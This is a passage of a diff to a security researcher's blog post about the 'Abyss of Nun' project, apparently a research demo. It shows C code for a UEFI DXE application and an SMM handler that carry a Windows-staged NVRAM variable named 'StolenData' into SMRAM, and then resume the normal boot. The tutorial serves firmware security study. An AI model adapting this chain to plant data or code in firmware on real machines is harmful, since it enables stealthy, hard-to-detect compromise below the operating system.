+<p>The firmware bridge is <code>AbyssOfNunSMM/TriggerSMI.c</code>. This is a <code>UEFI_APPLICATION</code>, not the final SMM driver. Its first job is to read the exact variable that the Windows driver created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CHAR16 <span style="color:#f92672">*</span>VariableName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;StolenData&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetVariable2</span>(VariableName, <span style="color:#f92672">&amp;</span>VendorGuid, <span style="color:#f92672">&amp;</span>Memory, <span style="color:#f92672">&amp;</span>StringSize);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EFI_ERROR</span>(Status)) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DEBUG</span>((DEBUG_ERROR, <span style="color:#e6db74">&#34;[TriggerSMI] Failed to get the variable: %r</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After retrieving the variable, the application locates <code>EFI_SMM_COMMUNICATION_PROTOCOL</code>, prepares an <code>EFI_SMM_COMMUNICATE_HEADER</code>, and forwards the buffer into SMM:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">LocateProtocol</span>(
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>gEfiSmmCommunicationProtocolGuid,
+</span></span><span style="display:flex;"><span>  NULL,
+</span></span><span style="display:flex;"><span>  (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>SmmCommunication
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CommSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">OFFSET_OF</span>(EFI_SMM_COMMUNICATE_HEADER, Data) <span style="color:#f92672">+</span> StringSize;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyMem</span>(CommHeader<span style="color:#f92672">-&gt;</span>Data, Buffer, StringSize);
+</span></span><span style="display:flex;"><span>CommHeader<span style="color:#f92672">-&gt;</span>MessageLength <span style="color:#f92672">=</span> StringSize;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyGuid</span>(<span style="color:#f92672">&amp;</span>CommHeader<span style="color:#f92672">-&gt;</span>HeaderGuid, <span style="color:#f92672">&amp;</span>gAbyssOfNunSmiGuid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> SmmCommunication<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Communicate</span>(
+</span></span><span style="display:flex;"><span>  SmmCommunication,
+</span></span><span style="display:flex;"><span>  CommHeader,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>CommSize
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>This is the most important bridge in the whole project. The repo does not model a fantasy &ldquo;Windows talks to SMRAM directly&rdquo; workflow. It models a far more realistic chain where a DXE-stage component uses the standard SMM communication mechanism to pass a buffer into an SMM handler.</p>
+<p>After the communication finishes, <code>TriggerSMI.efi</code> restores the normal boot path by loading <code>bootx64.efi</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DevicePath <span style="color:#f92672">=</span> <span style="color:#a6e22e">FileDevicePath</span>(LoadedImage<span style="color:#f92672">-&gt;</span>DeviceHandle, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">EFI</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BOOT</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bootx64.efi&#34;</span>);
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">LoadImage</span>(FALSE, ImageHandle, DevicePath, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>NewImageHandle);
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">StartImage</span>(NewImageHandle, NULL, NULL);
+</span></span></code></pre></div><p>So the DXE application is not just a messenger. It is also the component that keeps the boot chain coherent after the hand-off into SMM.</p>
+<h4 id="stage-3-the-smm-driver-receives-the-buffer"><strong>Stage 3: The SMM Driver Receives the Buffer</strong></h4>
+<p>The SMM side lives in <code>AbyssOfNunSMM/AbyssOfNun.c</code>. During entry, the driver registers its handler with <code>gMmst-&gt;MmiHandlerRegister()</code> using the same GUID that <code>TriggerSMI.c</code> places into the communication header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gMmst<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">MmiHandlerRegister</span>(
+</span></span><span style="display:flex;"><span>  AbyssOfNunHandler,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>gAbyssOfNunSmiGuid,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>DispatchHandle
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>That handler then treats the communication buffer as a <code>CHAR16</code> string, allocates memory from SMM pool, and copies the incoming data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ReceivedString <span style="color:#f92672">=</span> (CHAR16 <span style="color:#f92672">*</span>)CommBuffer;
+</span></span><span style="display:flex;"><span>StringSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">StrSize</span>(ReceivedString);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gSmst<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SmmAllocatePool</span>(EfiRuntimeServicesData, StringSize, <span style="color:#f92672">&amp;</span>Memory);
+</span></span><span style="display:flex;"><span>CHAR16 <span style="color:#f92672">*</span>CharVault <span style="color:#f92672">=</span> (CHAR16 <span style="color:#f92672">*</span>)Memory;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyMem</span>(CharVault, ReceivedString, StringSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gSmst<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SmmFreePool</span>(Memory);
+</span></span></code></pre></div><p>This code is exactly why I find the project useful in the context of SMM research. It proves that the buffer prepared in Windows can travel through NVRAM, through a DXE bridge, and into an SMM handler. At the same time, it also exposes an important limitation very clearly: the pool is freed before the handler returns, so the current implementation demonstrates <strong>delivery into SMM</strong>, not durable long-term persistence inside SMRAM.</p>
+<p>After these, the project will look like thiS in the beginning:</p>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/project-result.png" />
+</div> <br> <br>
+<p>And the debug.log:</p>
+<pre tabindex="0"><code>
 [Bds]Booting Abyss of Nun!
 FSOpen: Open &#39;\EFI\BOOT\TriggerSMI.efi&#39; Success
 ...
@@ -270,12 +505,168 @@ FSOpen: Open &#39;\EFI\BOOT\TriggerSMI.efi&#39; Success
 [Abyss Of Nun] im cooked! data has been saved to SMRAM!
 
 [...]
-</code></pre><h3 id=conclusion><strong>Conclusion</strong></h3><p>SMM looks mystical at first because it lives below the operating system, below the kernel, and even outside the visibility of most debugging habits we build in normal software research. But once we separate the layers, it becomes much easier to reason about. In this blog we started from the architectural idea of SMM, looked at how the processor enters it with an SMI, examined the role of SMRAM and the save-state map, and then followed how EDK2 actually prepares and dispatches SMM execution in practice.</p><p>The <strong>Abyss of Nun</strong> project closes that gap between theory and practice. It shows that communication with SMM is not about directly touching SMRAM from Windows, but about staging data through the boot path, bridging it in DXE, and then delivering it through the standard SMM communication mechanism. For me, this is exactly why SMM research is so fascinating: it sits at the boundary where processor architecture, firmware internals, boot flow, and offensive or defensive research all collide.</p><p>There is still much more to explore here. I only touched the entry path, the EDK2 flow, and one practical communication chain. In the future I want to go deeper into real SMI sources, SMM security boundaries, and of course the other shadow over this abyss: Intel ME. But for now, if this post helped make SMM feel a little less like black magic and a little more like a system we can actually reverse, inspect, and understand, then this journey did its job xd</p></div><div class=single-shell__back><h4><a href=/>Back to Home</a></h4></div><button class=single-shell__scroll-top type=button aria-label="Scroll to top" data-ui=scroll-top>
-<span aria-hidden=true>^</span></button></div><aside class=single-shell__aside><section class="single-shell__author single-shell__author--desktop"><div class=single-shell__author-static aria-hidden=true></div><div class=single-shell__author-heading>About Author</div><div class=single-shell__author-card><a class=single-shell__author-photo-link href=https://github.com/0xbekoo><div class=single-shell__author-photo-shell><img class=single-shell__author-photo src=https://github.com/0xbekoo.png alt=0xbekoo></div></a><div class=single-shell__author-body><a class=single-shell__author-name-link href=https://github.com/0xbekoo><span class=single-shell__author-name data-text=0xbekoo>0xbekoo</span></a><p class=single-shell__author-title>Low-Level Security Researcher</p></div></div></section><section class="single-shell__toc single-shell__toc--desktop"><div class=single-shell__toc-heading><span class=single-shell__toc-label>Contents</span></div><div class=single-shell__toc-body><nav id=TableOfContents-desktop><ul><li><ul><li><a href=#introduction><strong>Introduction</strong></a></li><li><a href=#system-management-mode-smm><strong>System Management Mode (SMM)</strong></a><ul><li><a href=#entering-smm-with-system-management-interrupt-smi><strong>Entering SMM with System Management Interrupt (SMI)</strong></a></li><li><a href=#system-management-ram-smram><strong>System Management RAM (SMRAM)</strong></a></li></ul></li><li><a href=#introduction-to-smm-in-edk2><strong>Introduction to SMM in EDK2</strong></a><ul><li><a href=#initializing-of-smbase-and-the-save-state-map><strong>Initializing of SMBASE and The Save State Map</strong></a></li><li><a href=#preparing-smi-handler-area><strong>Preparing SMI Handler Area</strong></a></li><li><a href=#handling-a-smi><strong>Handling a SMI</strong></a></li></ul></li><li><a href=#abyss-of-nun-project><strong>Abyss of Nun Project</strong></a><ul><li><a href=#stage-1-windows-prepares-the-hand-off><strong>Stage 1: Windows Prepares the Hand-off</strong></a></li><li><a href=#stage-2-dxe-bridges-the-data-into-smm><strong>Stage 2: DXE Bridges the Data into SMM</strong></a></li><li><a href=#stage-3-the-smm-driver-receives-the-buffer><strong>Stage 3: The SMM Driver Receives the Buffer</strong></a></li></ul></li><li><a href=#conclusion><strong>Conclusion</strong></a></li></ul></li></ul></nav></div></section></aside><div class=single-shell__panel aria-label="Post info"><div class=sp-sysinfo><div class=sp-sysinfo__header>// SYSINFO</div><div class=sp-sysinfo__row><span class=sp-label>DATE</span>
-<span>2026.03.26</span></div><div class=sp-sysinfo__row><span class=sp-label>READ</span>
-<span>14MIN</span></div><div class=sp-sysinfo__row><span class=sp-label>WORDS</span>
-<span>2917</span></div></div><div class=sp-tags><div class=sp-tags__header>// TAGS</div><a href=/tags/system-management-mode class=sp-tag>system-management-mode</a></div></div></div></div></article></div><footer class=container><hr class=soften><p>&copy;
-0xbekoo
-<span id=thisyear>2026</span>
-| 0xbekoo.github.io</p><p class=text-center><a href=https://x.com/0xbekooo>Twitter</a>
-<a href=https://github.com/0xbekoo>GitHub</a></p></footer></body><link rel=stylesheet href=/css/bootstrap.css><link rel=stylesheet href=/css/bootstrap-responsive.css><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/blog-callouts.css><link rel=stylesheet href=/css/mobile-reading.css><link rel=stylesheet href=/css/duat-gate.css><link rel=stylesheet href=/css/home-glitch.css><link rel=stylesheet href=/css/duat-boot.css><link rel=stylesheet href=/css/page-slide.css><link rel=stylesheet href=/css/projects.css><link rel=stylesheet href=/css/diagrams.css><script src=/js/jquery.js></script><script src=/js/bootstrap-transition.js></script><script src=/js/bootstrap-alert.js></script><script src=/js/bootstrap-modal.js></script><script src=/js/bootstrap-dropdown.js></script><script src=/js/bootstrap-scrollspy.js></script><script src=/js/bootstrap-tab.js></script><script src=/js/bootstrap-tooltip.js></script><script src=/js/bootstrap-popover.js></script><script src=/js/bootstrap-button.js></script><script src=/js/bootstrap-collapse.js></script><script src=/js/bootstrap-carousel.js></script><script src=/js/bootstrap-typeahead.js></script><script src=/js/bootstrap-affix.js></script><script>_386={fastLoad:!1,onePass:!1,speedFactor:1.5,duatBootImage:"/images/blog-images/hour.jpg"};function ThisYear(){document.getElementById("thisyear").innerHTML=(new Date).getFullYear()}</script><script src=/js/duat-boot.js></script><script src=/js/mobile-image-lightbox.js></script><script src=/js/page-slide.js></script></html>
+</code></pre><h3 id="conclusion"><strong>Conclusion</strong></h3>
+<p>SMM looks mystical at first because it lives below the operating system, below the kernel, and even outside the visibility of most debugging habits we build in normal software research. But once we separate the layers, it becomes much easier to reason about. In this blog we started from the architectural idea of SMM, looked at how the processor enters it with an SMI, examined the role of SMRAM and the save-state map, and then followed how EDK2 actually prepares and dispatches SMM execution in practice.</p>
+<p>The <strong>Abyss of Nun</strong> project closes that gap between theory and practice. It shows that communication with SMM is not about directly touching SMRAM from Windows, but about staging data through the boot path, bridging it in DXE, and then delivering it through the standard SMM communication mechanism. For me, this is exactly why SMM research is so fascinating: it sits at the boundary where processor architecture, firmware internals, boot flow, and offensive or defensive research all collide.</p>
+<p>There is still much more to explore here. I only touched the entry path, the EDK2 flow, and one practical communication chain. In the future I want to go deeper into real SMI sources, SMM security boundaries, and of course the other shadow over this abyss: Intel ME. But for now, if this post helped make SMM feel a little less like black magic and a little more like a system we can actually reverse, inspect, and understand, then this journey did its job xd</p>
+
+                </div>
+                <div class="single-shell__back">
+                    <h4><a href="/">Back to Home</a></h4>
+                </div>
+                <button class="single-shell__scroll-top" type="button" aria-label="Scroll to top" data-ui="scroll-top">
+                    <span aria-hidden="true">^</span>
+                </button>
+            </div>
+            
+            <aside class="single-shell__aside">
+                
+                <section class="single-shell__author single-shell__author--desktop">
+                    <div class="single-shell__author-static" aria-hidden="true"></div>
+                    <div class="single-shell__author-heading">About Author</div>
+                    <div class="single-shell__author-card">
+                        <a class="single-shell__author-photo-link" href="https://github.com/0xbekoo">
+                        <div class="single-shell__author-photo-shell">
+                            <img class="single-shell__author-photo" src="https://github.com/0xbekoo.png" alt="0xbekoo">
+                        </div>
+                        </a>
+                        <div class="single-shell__author-body">
+                            <a class="single-shell__author-name-link" href="https://github.com/0xbekoo">
+                            <span class="single-shell__author-name" data-text="0xbekoo">0xbekoo</span>
+                            </a>
+                            <p class="single-shell__author-title">Low-Level Security Researcher</p>
+                        </div>
+                    </div>
+                </section>
+                
+                
+                <section class="single-shell__toc single-shell__toc--desktop">
+                    <div class="single-shell__toc-heading">
+                        <span class="single-shell__toc-label">Contents</span>
+                    </div>
+                    <div class="single-shell__toc-body">
+                        <nav id="TableOfContents-desktop">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#introduction"><strong>Introduction</strong></a></li>
+        <li><a href="#system-management-mode-smm"><strong>System Management Mode (SMM)</strong></a>
+          <ul>
+            <li><a href="#entering-smm-with-system-management-interrupt-smi"><strong>Entering SMM with System Management Interrupt (SMI)</strong></a></li>
+            <li><a href="#system-management-ram-smram"><strong>System Management RAM (SMRAM)</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#introduction-to-smm-in-edk2"><strong>Introduction to SMM in EDK2</strong></a>
+          <ul>
+            <li><a href="#initializing-of-smbase-and-the-save-state-map"><strong>Initializing of SMBASE and The Save State Map</strong></a></li>
+            <li><a href="#preparing-smi-handler-area"><strong>Preparing SMI Handler Area</strong></a></li>
+            <li><a href="#handling-a-smi"><strong>Handling a SMI</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#abyss-of-nun-project"><strong>Abyss of Nun Project</strong></a>
+          <ul>
+            <li><a href="#stage-1-windows-prepares-the-hand-off"><strong>Stage 1: Windows Prepares the Hand-off</strong></a></li>
+            <li><a href="#stage-2-dxe-bridges-the-data-into-smm"><strong>Stage 2: DXE Bridges the Data into SMM</strong></a></li>
+            <li><a href="#stage-3-the-smm-driver-receives-the-buffer"><strong>Stage 3: The SMM Driver Receives the Buffer</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#conclusion"><strong>Conclusion</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                </section>
+                
+            </aside>
+            
+            <div class="single-shell__panel" aria-label="Post info">
+                <div class="sp-sysinfo">
+                    <div class="sp-sysinfo__header">// SYSINFO</div>
+                    <div class="sp-sysinfo__row">
+                        <span class="sp-label">DATE</span>
+                        <span>2026.03.26</span>
+                    </div>
+                    <div class="sp-sysinfo__row">
+                        <span class="sp-label">READ</span>
+                        <span>14MIN</span>
+                    </div>
+                    <div class="sp-sysinfo__row">
+                        <span class="sp-label">WORDS</span>
+                        <span>2917</span>
+                    </div>
+                </div>
+                
+                <div class="sp-tags">
+                    <div class="sp-tags__header">// TAGS</div>
+                    
+                    <a href="/tags/system-management-mode" class="sp-tag">system-management-mode</a>
+                    
+                </div>
+                
+            </div>
+            
+            
+        </div>
+    </div>
+</article>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    0xbekoo
+
+<span id="thisyear">2026</span>
+
+    | 0xbekoo.github.io
+
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://x.com/0xbekooo">Twitter</a> 
+        
+        <a href="https://github.com/0xbekoo">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/blog-callouts.css"><link rel="stylesheet" href="/css/mobile-reading.css"><link rel="stylesheet" href="/css/duat-gate.css"><link rel="stylesheet" href="/css/home-glitch.css"><link rel="stylesheet" href="/css/duat-boot.css"><link rel="stylesheet" href="/css/page-slide.css"><link rel="stylesheet" href="/css/projects.css"><link rel="stylesheet" href="/css/diagrams.css">
+<script src="/js/jquery.js"></script>
+
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: false , 
+        speedFactor: 1.5 ,
+        duatBootImage: "/images/blog-images/hour.jpg"
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script>
+<script src="/js/duat-boot.js"></script>
+<script src="/js/mobile-image-lightbox.js"></script>
+<script src="/js/page-slide.js"></script>
+</html>
